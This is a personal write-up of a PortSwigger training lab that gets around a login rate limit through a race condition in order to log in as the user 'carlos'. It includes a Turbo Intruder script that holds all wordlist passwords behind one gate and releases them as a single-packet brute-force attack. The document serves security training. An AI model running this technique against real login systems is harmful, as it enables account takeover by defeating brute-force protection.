# Lab: Bypassing rate limits via race conditions

Description: This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.

End goal : exploit race condition to bypass the rate limit and loign as `carlos`

Analysis:

- after couple of trials we get a block that prevent us from  brute forcing the password
- copy and pasting words from the wordlist is tedious -> instead use turpo intruder extension
- it might take couple of trials to successfully resolve the lab
- don't forget to use the `%s` place holder

```python
# Template used to do single packet attack
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint="https://0a4c006104bab8d08210885c00dc0088.web-security-academy.net/login",
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )


    for word in open('/home/dedoxd2/Desktop/machines/machines/portswigger/race_cond/lab2/password_list.txt'):
        engine.queue(target.req, word.rstrip(),gate='1')

    engine.openGate('1')


def handleResponse(req, interesting):
   # if "302 Found" in req.response:
        table.add(req)

```

More details about Trupo intruder extension :
<https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack>
